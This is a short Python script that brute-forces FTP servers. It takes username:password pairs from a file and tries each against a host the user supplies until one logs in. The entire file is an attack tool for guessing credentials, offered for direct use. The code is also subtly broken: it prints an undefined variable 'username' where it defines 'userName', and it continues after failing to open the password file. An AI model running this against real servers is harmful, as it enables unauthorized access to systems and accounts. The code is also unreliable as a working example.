#!/usr/bin/python
# python 3
# The file contains username and password seperated by :

import ftplib


def bruteLogin(host,passwdFile):
    try:
        passFile = open(passwdFile,'r')
    except:
        print("[-] Could not open file.")
    for line in passFile.readlines():
        userName = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print("[+] Trying: " + username + ':' + password)
        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(userName,password)
            print("[+] Login Suceeded with: " + username + ':' + password)
            ftp.quit()
            return(userName,password)
        except:
            pass
    print("[-] Password not in the list")


host = input("[*] Enter the host IP address: ")
passwdFile = input("[*] Enter User/Password File Path: ")
bruteLogin(host, passwdFile)



